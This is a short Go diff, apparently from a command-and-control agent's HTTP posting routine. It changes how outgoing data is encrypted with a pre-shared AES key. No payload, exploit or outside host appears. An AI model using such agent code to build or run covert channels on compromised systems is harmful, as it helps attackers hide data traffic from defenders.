@@ -250,7 +250,7 @@ func (c *C2Patchthrough) htmlPostData(urlEnding string, sendData []byte) []byte 
 	//log.Println("Posting to URL:", url)
 	// If the AesPSK is set, encrypt the data we send
 	if len(c.AesPSK) != 0 {
-		sendData = EncryptMessage(sendData)
+		sendData = EncryptMessage(sendData, AesPSK)
 	}
 
 	contentLength := len(sendData)
